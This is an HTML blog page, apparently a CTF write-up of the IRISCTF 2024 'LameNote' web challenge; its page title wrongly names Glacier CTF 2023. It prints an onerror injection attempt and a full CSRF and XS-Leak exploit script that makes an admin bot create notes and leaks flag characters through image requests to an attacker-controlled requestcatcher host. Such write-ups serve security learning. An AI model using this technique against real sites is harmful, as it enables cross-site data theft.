@@ -1,0 +1,166 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta http-equiv="X-UA-Compatible" content="ie=edge">
+  <title>Glacier CTF 2023 Writeup | Rudra Pratap Singh</title>
+
+  <!-- Bootstrap CSS -->
+  <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css" 
+        integrity="sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T" 
+        crossorigin="anonymous">
+
+  <!-- Custom CSS -->
+  <style>
+    body {
+      background-color: #f8f9fa;
+      color: #333;
+      font-family: 'Arial', sans-serif;
+    }
+
+    .container {
+      max-width: 800px;
+      margin: auto;
+      padding-top: 50px;
+    }
+
+    h1 {
+      font-weight: bold;
+      color: #007bff;
+      margin-bottom: 30px;
+    }
+
+    .meta {
+      font-style: italic;
+      color: #6c757d;
+      margin-bottom: 30px;
+    }
+
+    .content {
+      background-color: white;
+      padding: 20px;
+      border-radius: 8px;
+      box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+    }
+
+    img {
+      max-width: 100%;
+      height: auto;
+      border-radius: 8px;
+    }
+
+    .content p {
+      line-height: 1.6;
+    }
+
+    /* Code Formatting Styles */
+    pre {
+      background-color: #f4f4f4;
+      border-radius: 5px;
+      padding: 10px;
+      overflow-x: auto;
+      font-family: 'Courier New', monospace;
+      line-height: 1.5;
+    }
+
+    code {
+      background-color: #e8e8e8;
+      border-radius: 3px;
+      font-family: 'Courier New', monospace;
+      padding: 2px 5px;
+    }
+
+    /* Back button styling */
+    .back-button {
+      display: block;
+      width: 100px;
+      margin: 30px auto;
+      padding: 10px 20px;
+      background-color: #007bff;
+      color: white;
+      text-align: center;
+      border-radius: 5px;
+      text-decoration: none;
+      transition: background-color 0.3s;
+    }
+
+    .back-button:hover {
+      background-color: #0056b3;
+    }
+  </style>
+</head>
+
+<body>
+  <div class="container">
+    <h1>IRISCTF 2024 Web [LameNote]</h1>
+    <div class="meta">Published on 8th January 2024 by 0xrudra</div>
+    <div class="content">
+      <p>
+        This was one of the challenge from <b>IRISCTF</b> which I wasn't able to solve it during the CTF. 
+        First let me walk you through the challenge and later we'll discuss where I got stuck.
+        <br><br>
+        Application had some common functionalities like create note and search note additionally you can send a URL to admin. <br><hr>
+        <img src="/img/main-app.png"><hr>
+        I got the gist it's going to be a <b>XS-Leak</b> challenge and knew the path on how to solve it -> HTML Injection > Exfilterate Data > Win the challenge. While analyzing the code it was clear that the application had protection.<br><br>
+        <pre><code>@app.route("/create", methods=["POST"])
+            @check_request
+            def create():
+                if "<" in request.form.get("text", "(empty)") or \
+                        "<" in request.form.get("title", "(empty)") or \
+                        "<" in request.form.get("image", ""):
+                    return "Really?"</code></pre><br>
+        I was stuck there and though on injecting attribute to the image tag for example <code>https://example.com/logo.png ' onerror=alert(1)</code><br><br>   
+        <img src="/img/lamenote-DOM.png"><br><br>
+        Now if we look at the CSP header it's very strict except for the <code>img-src</code> directive which is allowing to embed our image URL.<br><br>  
+        <img src="/img/csp.png"><br><br>
+        I was stuck here till the end trying to figure out how we can use img attribute to exfilterate the flag and finally gave up. <br>
+       <br>Once the CTF was over I was going through one of the writeup [<a href="https://blog.hamayanhamayan.com/entry/2024/01/08/132233#Web-Exploitation-LameNote">https://blog.hamayanhamayan.com/entry/2024/01/08/132233#Web-Exploitation-LameNote</a>] and realised where I was wrong. <br><br>
+       I missed one of the important code and just scrolled over it which was key to solving the challenge. <br><br>
+       <pre><code>if len(results) == 1:
+                return render_note(results[0])
+            
+            return "<!DOCTYPE html><body>" + "".join("<a href='/note/" + note["id"] + "'>" + note["title"] + "</a> " for note in results) + "</body>"</code></pre>
+        So to understand the solution we need one more bit of information i.e. the admin bot creates a note with the flag in the text. <br><br>
+        Now back to our little snippet, the code basically renders the note if the length of the search result is 1 else it will <b>NOT</b> render the list of notes meaning that if the note is unique it will render the image and if the result is not unique it would not render the image. <br><br>
+        One more thing to note here is that there is no <b>CSRF</b> protection while creating notes so we can send a URL to admin bot which will create notes for flag combinations and we can search for the flag. <br><br>
+        I copied and beautified the script from the author and ran it on my local machine and it worked like a charm. <br><br>
+        <pre><code>const sleep = ms => new Promise(r => setTimeout(r, ms));
+            const prefix = "irisctf{please_";
+            const chars = "abcdefghijklmnopqrstuvwxyz_";
+            
+            setTimeout(async () => {
+                for (var i in chars) {
+                    form.title.value = prefix + chars[i];
+                    form.text.value = prefix + chars[i];
+                    form.image.value = "https://[yours].requestcatcher.com/" + prefix + chars[i];
+                    form.submit();
+                    await sleep(500);
+                }
+            
+                for (var i in chars) {
+                    form2.query.value = prefix + chars[i];
+                    form2.submit();
+                    await sleep(500);
+                }
+            }, 0);
+
+&lt;iframe name="dummyFrame" id="dummyFrame"&gt;&lt;/iframe&gt;
+&lt;form method="POST" target="dummyFrame" id="form" action="https://lamenote-web.chal.irisc.tf/create"&gt;
+    &lt;input name="title"&gt;
+    &lt;input name="text"&gt;
+    &lt;input name="image"&gt;
+&lt;/form&gt;
+&lt;form method="GET" target="dummyFrame" id="form2" action="https://lamenote-web.chal.irisc.tf/search"&gt;
+    &lt;input name="query"&gt;
+&lt;/form&gt;</code></pre>
+<br>
+So that's it for this writeup. Hope you enjoyed it. <br><br>
+        </p>
+    </div>
+
+    <!-- Back Button -->
+    <a href="javascript:history.back()" class="back-button">Back</a>
+  </div>
+</body>
+</html>
